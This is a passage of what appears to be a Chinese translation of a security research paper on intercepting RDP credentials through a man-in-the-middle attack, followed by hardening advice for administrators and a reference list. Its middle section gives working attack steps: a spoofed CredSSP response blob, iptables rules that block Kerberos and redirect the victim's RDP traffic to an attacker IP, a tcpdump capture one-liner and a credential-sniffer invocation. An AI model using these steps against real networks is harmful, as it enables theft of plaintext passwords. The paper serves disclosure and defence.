我们需要问自己的问题是：服务器是如何验证NTLM应答的？它会咨询域控制器。那么，如果域控制器不可用呢？ 它会说“算了，让我们使用增强型RDP安全协议吧，不用NLA了”，客户端也会言听计从。但是有趣的是：由于客户端已经缓存了用户的密码，所以它会直接传输它，而不是将用户引导至Windows登录屏幕！ 这正是我们想要的。这样除了SSL警告之外，就没有任何可疑的东西引起受害者的注意了。

所以，我们要做的事情是：当客户端发送它的NTLM应答后，我们将服务器的响应替换为： 

```
00000000: 300d a003 0201 04a4 0602 04c0 0000 5e 0.............^
```

我没有找到与此有关的文档，但它的确是无法联系域控制器时的服务器响应。客户端将返回到增强型RDP安全协议，并显示SSL警告，同时将SSL隧道内的密码传输到服务器。

请注意，我们没有收到SSL警告。根据规范[19]，客户端将SSL证书的指纹发送到使用由CredSSP协议协商的密钥加密的服务器。

如果它与服务器证书的指纹不匹配，那么会话将会被终止。这就是为什么即使受害者提供不正确的凭据也不要紧的原因—— 我们可以看到（不正确的）密码。

但是，如果密码正确，我们将观察到一个TLS内部错误。

我想出的解决方法是直接篡改NTLM应答。我对Python脚本进行了相应的修改，通过更改NTLM应答让NTLM身份验证总是失败。不过，受害者是不会注意到这一点的，因为正如我们刚才看到的，我们可以将连接降级到TLS，这样会重新传输凭据。

但是，还有一件事需要注意。如果客户端会显示正在尝试连接一台加入域的计算机，那么它就不会使用NTLM，而是使用Kerberos，这意味着它将在建立RDP连接之前与域控制器联系以请求相应的ticket。这是一件好事，因为Kerberos的ticket对攻击者而言，要比没有“盐化”的NTLM应答更加微不足道。但是，如果攻击者处于MitM位置，那么他就可以阻止针对Kerberos服务的所有请求。如果客户端无法联系Kerberos服务，那会发生什么呢？实际上，它会退回到NTLM。

将这种攻击技术武器化 

到目前为止，我们一直在实验室环境下进行的。所以，受害者在RDP客户端中输入的不是我们的IP，而是他们自己的服务器的IP或主机名。有多种方法可以让我们成为中间人，但在这里我们将利用ARP欺骗。这种方法并不难，过一会儿就给出一个概念证明式的演示。由于这种攻击是在网络协议的第二层进行的，所以要求我们必须与受害者在同一个子网中。

在我们欺骗ARP回复并启用IPv4流量转发后，受害者和网关之间的所有通信都将通过我们的计算机。由于仍然不知道受害者输入的IP地址，所以仍然无法运行我们的Python脚本。

首先，我们创建一个iptables规则，丢弃受害者用于RDP服务器的SYN数据包： 

```
$ iptables -A FORWARD -p tcp -s "$VICTIM_IP" --syn --dport 3389 -j REJECT
```

我们不想重定向其他任何流量，因为受害者可能正在使用已建立的RDP连接，否则就会发生中断。如果我们这里不丢弃那些数据包的话，受害者就会与真正的主机建立连接，而我们则想让受害者与我们建立连接。

第二，我们等待来自受害者目的地端口为3389的TCP SYN分组，以便掌握原始目的地主机的地址。为此，我们可以使用tcpdump： 



```
$ tcpdump -n -c 1 -i "$IFACE" src host "$VICTIM_IP" and 
"tcp[tcpflags] &amp; tcp-syn != 0" and 
dst port 3389 2&gt; /dev/null | 
sed -e 's/.*&gt; ([0-9.]*).3389:.*/1/'
```

选项-c 1告诉tcpdump在第一个匹配数据包之后退出。这个SYN包将被丢弃，但这并不重要，因为受害者的系统很快就会再次尝试发送。

第三，我们将检索RDP服务器的SSL证书，并创建一个与原始证书具有相同公用名的新的自签名证书。我们还可以修正证书的到期日期，除非您对其指纹进行长时间的细致检查，否则它与原始文件很难区分。为此，我编写了一个小型的Bash脚本[23]来处理这项工作。

现在我们删除前面的iptables规则，并将受害者发送给RDP主机的TCP流量重定向到我们的IP地址： 



```
$ iptables -t nat -A PREROUTING -p tcp -d "$ORIGINAL_DEST" 
-s "$VICTIM_IP" --dport 3389 -j DNAT --to-destination "$ATTACKER_IP"
```

为了强制从Kerberos降级到NTLM，我们可以将受害者发送到88端口的所有TCP流量全部拦截： 



```
$ iptables -A INPUT -p tcp -s "$VICTIM_IP" --dport 88 
-j REJECT --reject-with tcp-reset
```

这样，我们就掌握了运行Python脚本所需的全部信息： 

```
$ rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b5c3a358267af43d.png)

图6：左侧：受害者看到的域控制器的RDP会话。右侧：攻击者看到的明文密码。

<br>

**建议 **

那么，作为系统管理员你可能想知道，应该采取哪些行动来保护自己网络的安全。

首先，如果服务器的身份不能被验证，即如果SSL证书没有被可信证书颁发机构（CA）签名，则拒绝RDP连接是绝对关键的。您必须使用企业CA来签署所有服务器证书。如果无法验证证书，则客户端必须通过GPO [22]配置为禁止连接：

在服务器端是否执行CredSSP（NLA）的问题是非常棘手的。为了便于记录，这也可以作为组策略[20]推出：

我们已经看到，客户端会缓存用户的凭据，以便在NLA不可用的情况下方便地重新传输它们——我们知道，这些凭据就位于内存中。因此，它们可能被具有SYSTEM权限的攻击者读取，例如使用Mimikatz [24]等。这是一个令人难以置信的常见网络攻击情形：攻陷一台机器，利用Mimikatz提取登录用户的明文凭证，并通过横向运动攻击其他帐户，直到找到域管理员密码为止。这就是为什么你只能在域控制器上使用你的个人域管理员帐户，而不应该在其他地方使用的原因。

但是如果使用RDP远程进入域控制器则会在工作站上留下高权限帐户的痕迹，这是一个严重的问题。此外，如果您强制执行NLA，在启用“用户必须在下次登录时更改密码”选项后，那么只能使用终端服务器的用户会被锁定。我们知道，NLA的唯一优点是更轻便，可以减轻拒绝服务攻击的影响，因为它占用较少的资源，并且可以保护RDP免受基于网络的攻击，如MS12-020 [25]。这就是为什么目前我们正在讨论是否建议禁用RDA的NLA的原因。

如果您希望避免使用NLA，请将组策略“要求为远程连接使用特定安全层”设置为SSL [20]。

为了进一步增加RDP连接的安全性，您可以采取的另一项措施是，除了用户凭证之外，为用户验证添加其他验证因子。目前有许多相关的第三方产品，至少在保护关键系统如域控制器的时候，您可以考虑这一措施。

如果你的Linux机器是通过RDP连接到Windows终端服务器的话，我需要提醒的是，流行的RDP客户端rdesktop不支持NLA，并且根本不对SSL证书进行验证。所以我建议使用xfreerdp，至少它会验证SSL证书。

最后，鼓励大家对您的同事和用户不断重申：不要轻视SSL警告，无论是在RDP或HTTPS或其他任何情况下。作为管理员，您有责任确保您的客户端系统在受信任的CA列表中含有您的根CA。这样，这些警告就属于异常，需要马上通知IT部门。

如果您有任何其他问题或意见，请随时与我们联系。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015d47c9f285e3e84a.png)

图7：一个关键的GPO设置：为客户端配置服务器验证 

<br>

**参考资料 **

[1] Vollmer, A., Github.com: Seth (2017), [https://github.com/SySS-Research/Seth](https://github.com/SySS-Research/Seth)   (Cited onpage 2.)

[2] Montoro M., Cain &amp; Abel (2014), [http://www.oxid.it/cain.html](http://www.oxid.it/cain.html)   (Cited on page 2.)

[3] Wikipedia contributors, Finite group, [https://en.wikipedia.org/w/index.php?title=Finite_group&amp;oldid=768290355](https://en.wikipedia.org/w/index.php?title=Finite_group&amp;oldid=768290355)    (accessed March 8, 2017) (Cited on page 5.)

[4] Wikipedia contributors, Shor’s algorithm (accessed March 8, 2017), [https://en.wikipedia.org/w/index.php?title=Shor%27s_algorithm&amp;oldid=767553912](https://en.wikipedia.org/w/index.php?title=Shor%27s_algorithm&amp;oldid=767553912)   (Cited on page 5.)

[5] Shor, P. W., Polynomial-Time Algorithms for Prime Factorization and Discrete Logarithms on a QuantumComputer (1995), [https://arxiv.org/abs/quant-ph/9508027v2](https://arxiv.org/abs/quant-ph/9508027v2)   (Cited on page 5.)

[6] Microsoft Developer Network, [MS-RDPBCGR]: Non-FIPS (2017), [https://msdn.microsoft.com/en-us/library/cc240785.aspx](https://msdn.microsoft.com/en-us/library/cc240785.aspx) (Cited on pages 6 and 9.)

[7] Schneier, B., Why Cryptography Is Harder Than It Looks (1997), [https://www.schneier.com/essays/archives/1997/01/why_cryptography_is.html ](https://www.schneier.com/essays/archives/1997/01/why_cryptography_is.html)(Cited on page 6.)

[8] Microsoft Developer Network, [MS-RDPBCGR]: Terminal Services Signing Key (2017), [https://msdn.microsoft.com/en-us/library/cc240776.aspx](https://msdn.microsoft.com/en-us/library/cc240776.aspx)  (Cited on pages 6 and 8.)

[9] Microsoft Developer Network, [MS-RDPBCGR]: Encrypting and Decrypting the I/O Data Stream (2017),[https://msdn.microsoft.com/en-us/library/cc240787.aspx](https://msdn.microsoft.com/en-us/library/cc240787.aspx) (Cited on page 6.)

[10] Microsoft Developer Network, [MS-RDPBCGR]: Server Security Data (TS_UD_SC_SEC1) (2017), [https://msdn.microsoft.com/en-us/library/cc240518.aspx](https://msdn.microsoft.com/en-us/library/cc240518.aspx) (Cited on page 7.)

[11] Microsoft Developer Network, [MS-RDPBCGR]: Signing a Proprietary Certificate (2017), [https://msdn.microsoft.com/en-us/library/cc240778.aspx](https://msdn.microsoft.com/en-us/library/cc240778.aspx)  (Cited on page 8.)

[12] Microsoft Developer Network, [MS-RDPBCGR]: Client Input Event PDU Data (TS_INPUT_PDU_DATA)(2017), [https://msdn.microsoft.com/en-us/library/cc746160.aspx](https://msdn.microsoft.com/en-us/library/cc746160.aspx)   (Cited on page 10.)

[13] Microsoft Developer Network, [MS-RDPBCGR]: Keyboard Event (TS_KEYBOARD_EVENT) (2017), [https://msdn.microsoft.com/en-us/library/cc240584.aspx](https://msdn.microsoft.com/en-us/library/cc240584.aspx) (Cited on page 11.)

[14] Brouwer, A., Keyboard Scancodes (2009), [https://www.win.tue.nl/~aeb/linux/kbd/scancodes-10.html#ss10.6](https://www.win.tue.nl/~aeb/linux/kbd/scancodes-10.html#ss10.6) (Cited on page 11.)

[15] Microsoft Developer Network, Microsoft NTLM (2017), [https://msdn.microsoft.com/en-us/library/aa378749%28VS.85%29.aspx](https://msdn.microsoft.com/en-us/library/aa378749%28VS.85%29.aspx) (Cited on page 14.)

[16] Weeks, M., Attacking Windows Fallback Authentication (2015), [https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf](https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf)  (Cited on page 14.)

[17] Hashcat, [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)   (Cited on page 14.)

[18] John The Ripper, [http://www.openwall.com/john/](http://www.openwall.com/john/)   (Cited on page 14.)

[19] Microsoft Developer Network, [MS-CSSP]: TSRequest (2017), [https://msdn.microsoft.com/enus/library/cc226780.aspx](https://msdn.microsoft.com/enus/library/cc226780.aspx) (Cited on page 15.)

[20] Microsoft Technet, Security (2017), [https://technet.microsoft.com/en-us/library/cc771869(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc771869(v=ws.10).aspx) (Cited on page 18.)

[21] Microsoft Technet, Network Security: Restrict NTLM: NTLM authentication in this domain (2017), [https://technet.microsoft.com/en-us/library/jj852241(v=ws.11).aspx](https://technet.microsoft.com/en-us/library/jj852241(v=ws.11).aspx) (Not cited.)

[22] Microsoft Technet, Remote Desktop Connection Client (2017), [https://technet.microsoft.com/en-us/library/cc753945(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc753945(v=ws.10).aspx) (Cited on page 18.)

[23] Vollmer, A., Github.com: clone-cert.sh (2017),  [https://github.com/SySS-Research/clonecert](https://github.com/SySS-Research/clonecert)  (Cited on page 16.)

[24] Delpy, B., Github.com: mimikatz (2017), [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)   (Cited onpage 18.)

[25] Microsoft Technet, Security Bulletin MS12-020 (2012), [https://technet.microsoft.com/enus/library/security/ms12-020.aspx](https://technet.microsoft.com/enus/library/security/ms12-020.aspx) (Cited on page 18.)
